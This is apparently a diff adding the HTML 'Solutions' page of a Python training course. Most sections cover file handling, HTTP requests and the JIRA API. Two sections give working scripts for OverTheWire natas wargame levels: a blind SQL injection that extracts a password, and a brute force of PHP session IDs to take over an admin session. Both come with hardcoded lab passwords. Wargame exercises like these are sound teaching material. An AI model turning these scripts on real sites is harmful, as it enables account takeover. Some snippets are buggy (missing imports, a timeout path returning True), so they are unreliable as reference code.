@@ -1,0 +1,437 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Solutions &mdash; Python Training 0.1 documentation</title>
+  
+
+  
+  
+    <link rel="shortcut icon" href="_static/favicon.ico"/>
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="genindex.html"/>
+        <link rel="search" title="Search" href="search.html"/>
+    <link rel="top" title="Python Training 0.1 documentation" href="index.html"/> 
+
+  
+  <script src="_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="index.html" class="icon icon-home"> Python Training
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                0.1
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+                <ul>
+<li class="toctree-l1"><a class="reference internal" href="intro.html">Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="environment.html">Environment configuration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="project_structure.html">Project structure</a></li>
+<li class="toctree-l1"><a class="reference internal" href="builtins.html">Built-in types - good practices</a></li>
+<li class="toctree-l1"><a class="reference internal" href="strings.html">String formatting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="files.html">Working with files</a></li>
+<li class="toctree-l1"><a class="reference internal" href="regular_expressions.html">Regular expressions</a></li>
+<li class="toctree-l1"><a class="reference internal" href="requests.html">HTTP in Python with <code class="docutils literal"><span class="pre">requests</span></code></a></li>
+<li class="toctree-l1"><a class="reference internal" href="api.html">Working with APIs</a></li>
+<li class="toctree-l1"><a class="reference internal" href="arguments.html">*args and **kwargs</a></li>
+<li class="toctree-l1"><a class="reference internal" href="gotchas.html">Common Python gotchas</a></li>
+<li class="toctree-l1"><a class="reference internal" href="advanced.html">Advanced concepts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="logging.html">Logging</a></li>
+<li class="toctree-l1"><a class="reference internal" href="docs.html">Creating documentation with <code class="docutils literal"><span class="pre">Sphinx</span></code></a></li>
+<li class="toctree-l1"><a class="reference internal" href="solutions.html">Solutions</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+        <a href="index.html">Python Training</a>
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+ 
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="index.html">Docs</a> &raquo;</li>
+      
+    <li>Solutions</li>
+      <li class="wy-breadcrumbs-aside">
+        
+          
+            <a href="_sources/solutions_proxy.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="solutions">
+<h1>Solutions<a class="headerlink" href="#solutions" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="solution-to-fil00">
+<h2>Solution to FIL00<a class="headerlink" href="#solution-to-fil00" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="working-script">
+<h3>Working script<a class="headerlink" href="#working-script" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">random</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;input.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;input.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_in</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;output.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_out</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">f_in</span><span class="p">:</span>
+        <span class="n">f_out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">l</span><span class="p">)</span><span class="o">*</span><span class="s2">&quot;X&quot;</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-req00">
+<span id="req00-solution"></span><h2>Solution to REQ00<a class="headerlink" href="#solution-to-req00" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="id1">
+<h3>Working script<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">from</span> <span class="nn">credentials</span> <span class="kn">import</span> <span class="n">username</span><span class="p">,</span> <span class="n">username</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;https://userdatabase.lsy.pl/employees/report/employee/active&quot;</span>
+
+<span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span> <span class="c1"># to ignore certificate warnings</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-req01">
+<span id="req01-solution"></span><h2>Solution to REQ01<a class="headerlink" href="#solution-to-req01" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="malicious-query">
+<h3>Malicious query<a class="headerlink" href="#malicious-query" title="Permalink to this headline">¶</a></h3>
+<p>The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be &#8220;A&#8221;):</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="s1">&#39;natas16&quot; AND password LIKE BINARY &quot;A%&#39;</span>
+</pre></div>
+</div>
+<p>The full query will have then the form</p>
+<div class="highlight-sql"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="ss">&quot;natas16&quot;</span> <span class="k">AND</span> <span class="n">password</span> <span class="k">LIKE</span> <span class="nb">BINARY</span> <span class="ss">&quot;A%&quot;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id2">
+<h3>Working script<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+
+<span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://natas15.natas.labs.overthewire.org&quot;</span>
+
+<span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s1">&#39;natas15&#39;</span><span class="p">,</span> <span class="s1">&#39;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&#39;</span><span class="p">)</span>
+
+<span class="n">template</span> <span class="o">=</span> <span class="s1">&#39;natas16&quot; AND password LIKE BINARY &quot;{}%&#39;</span>
+
+<span class="n">letters</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">letters</span><span class="o">+</span><span class="n">letter</span><span class="p">)}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&quot;This user exists&quot;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">letters</span> <span class="o">+=</span> <span class="n">letter</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">letters</span><span class="p">)</span>
+            <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Password found {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">letters</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-req02">
+<span id="req02-solution"></span><h2>Solution to REQ02<a class="headerlink" href="#solution-to-req02" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="id3">
+<h3>Working script<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;http://natas18.natas.labs.overthewire.org&quot;</span>
+<span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s1">&#39;natas18&#39;</span><span class="p">,</span> <span class="s1">&#39;xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP&#39;</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">sess_id</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Trying session ID {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sess_id</span><span class="p">))</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;PHPSESSID&quot;</span><span class="p">:</span><span class="nb">str</span><span class="p">(</span><span class="n">sess_id</span><span class="p">)}</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;y&quot;</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;You are logged in as a regular user.&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Admin session ID found {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sess_id</span><span class="p">))</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&quot;Password: ([A-Za-z0-9]{32})&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">password</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Password: &quot;</span><span class="o">+</span><span class="n">password</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Password not found in the response&quot;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;FAILED&quot;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Brute force on Session ID failed&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-api00">
+<span id="api00-solution"></span><h2>Solution to API00<a class="headerlink" href="#solution-to-api00" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="id4">
+<h3>Working script<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">jira</span> <span class="kn">import</span> <span class="n">JIRA</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s2">&quot;https://issues.apache.org/jira/&quot;</span>
+<span class="n">j</span> <span class="o">=</span> <span class="n">JIRA</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
+
+<span class="n">search_results</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">search_issues</span><span class="p">(</span><span class="s1">&#39;type=&quot;New Feature&quot;&#39;</span><span class="p">,</span> <span class="n">maxResults</span><span class="o">=</span><span class="mi">100</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">issue</span> <span class="ow">in</span> <span class="n">search_results</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">issue</span><span class="o">.</span><span class="n">fields</span><span class="o">.</span><span class="n">summary</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-api01">
+<span id="api01-solution"></span><h2>Solution to API01<a class="headerlink" href="#solution-to-api01" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="create-a-new-issue-with-a-custom-field">
+<h3>Create a new issue with a custom field<a class="headerlink" href="#create-a-new-issue-with-a-custom-field" title="Permalink to this headline">¶</a></h3>
+<p>By looking at the response received with :py:meth`jira.JIRA.createmeta`</p>
+<p>we can see that the custom field &#8220;Start Date&#8221; has the name <code class="docutils literal"><span class="pre">customfield_10018</span></code></p>
+<div class="section" id="id5">
+<h4>Working script<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">jira</span> <span class="kn">import</span> <span class="n">JIRA</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+
+<span class="n">URL</span> <span class="o">=</span> <span class="s1">&#39;https://trackspace.lhsystems.com/&#39;</span>
+<span class="n">username</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Username: &quot;</span><span class="p">)</span>
+<span class="n">password</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Password: &quot;</span><span class="p">)</span>
+
+<span class="n">j</span> <span class="o">=</span> <span class="n">JIRA</span><span class="p">(</span><span class="n">server</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span> <span class="n">basic_auth</span><span class="o">=</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+
+<span class="n">project</span> <span class="o">=</span> <span class="s1">&#39;LSYPA&#39;</span>
+<span class="n">issuetype</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Task&#39;</span><span class="p">}</span>
+<span class="n">summary</span> <span class="o">=</span> <span class="s1">&#39;JIRA Training task&#39;</span>
+<span class="n">description</span> <span class="o">=</span> <span class="s1">&#39;Task description&#39;</span>
+
+<span class="n">date</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">issue_fields</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;project&#39;</span><span class="p">:</span> <span class="n">project</span><span class="p">,</span>
+                <span class="s1">&#39;issuetype&#39;</span><span class="p">:</span> <span class="n">issuetype</span><span class="p">,</span>
+                <span class="s1">&#39;summary&#39;</span><span class="p">:</span> <span class="n">summary</span><span class="p">,</span>
+                <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">description</span><span class="p">,</span>
+                <span class="s1">&#39;customfield_10018&#39;</span><span class="p">:</span> <span class="n">date</span><span class="p">}</span>
+
+<span class="n">issue</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">create_issue</span><span class="p">(</span><span class="n">fields</span><span class="o">=</span><span class="n">issue_fields</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Task with id: {} created.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">issue</span><span class="o">.</span><span class="n">key</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="create-a-sub-task">
+<h3>Create a Sub-task<a class="headerlink" href="#create-a-sub-task" title="Permalink to this headline">¶</a></h3>
+<p>Observing the fields of a subtask we can find the field <code class="docutils literal"><span class="pre">parent</span></code> which should specify the key of the parent task.</p>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="n">parent_issue_key</span> <span class="o">=</span> <span class="s1">&#39;LSYPA-488&#39;</span>
+<span class="n">project</span> <span class="o">=</span> <span class="s1">&#39;LSYPA&#39;</span>
+<span class="n">summary</span> <span class="o">=</span> <span class="s1">&#39;JIRA Training Sub-task&#39;</span>
+<span class="n">description</span> <span class="o">=</span> <span class="s1">&#39;Sub-Task description&#39;</span>
+
+<span class="n">parent</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">parent_issue_key</span><span class="p">}</span>
+
+<span class="n">issuetype</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;Sub-task&#39;</span><span class="p">}</span>
+
+<span class="n">issue_fields</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;project&#39;</span><span class="p">:</span> <span class="n">project</span><span class="p">,</span>
+                <span class="s1">&#39;issuetype&#39;</span><span class="p">:</span> <span class="n">issuetype</span><span class="p">,</span>
+                <span class="s1">&#39;parent&#39;</span><span class="p">:</span> <span class="n">parent</span><span class="p">,</span>
+                <span class="s1">&#39;summary&#39;</span><span class="p">:</span> <span class="n">summary</span><span class="p">,</span>
+                <span class="s1">&#39;description&#39;</span><span class="p">:</span> <span class="n">description</span><span class="p">}</span>
+
+<span class="n">issue</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">create_issue</span><span class="p">(</span><span class="n">fields</span><span class="o">=</span><span class="n">issue_fields</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&quot;Sub-task with id: {} created.&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">issue</span><span class="o">.</span><span class="n">key</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="solution-to-adv00">
+<span id="adv00-solution"></span><h2>Solution to ADV00<a class="headerlink" href="#solution-to-adv00" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="id6">
+<h3>Working script<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-python"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">wait_until</span><span class="p">(</span><span class="n">condition</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">raise_exception</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Wait until the condition returned by &#39;condition&#39; function is fulfilled,</span>
+<span class="sd">    or the timeout is expired. The condition should be checked every 100ms</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        condition: a function that checks a condition and returns True or False</span>
+<span class="sd">        timeout: maximal timeout after which the function will raise TimeoutException</span>
+<span class="sd">                or return False (if raise_exception is False)</span>
+<span class="sd">        msg: message added to the TimeoutException</span>
+<span class="sd">    Returns:</span>
+<span class="sd">        True when the condition is fulfilled within the timeout,</span>
+<span class="sd">        False when the condition is not fulfilled within the timeout</span>
+<span class="sd">                and &#39;raise_exception&#39; is False</span>
+<span class="sd">    Raises:</span>
+<span class="sd">        TimeoutException: if raise_exception is True</span>
+<span class="sd">                        and the condition is not fulfilled within timeout</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+
+    <span class="k">while</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">t0</span> <span class="o">&lt;</span> <span class="n">timeout</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">condition</span><span class="p">():</span>
+            <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">raise_exception</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="n">TimeoutError</span><span class="p">(</span><span class="s2">&quot;Condition not fulfilled within timeout. Message: &quot;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+
+
+           </div>
+          </div>
+          <footer>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2016, Piotr Baranowski.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'./',
+            VERSION:'0.1',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true
+        };
+    </script>
+      <script type="text/javascript" src="_static/jquery.js"></script>
+      <script type="text/javascript" src="_static/underscore.js"></script>
+      <script type="text/javascript" src="_static/doctools.js"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
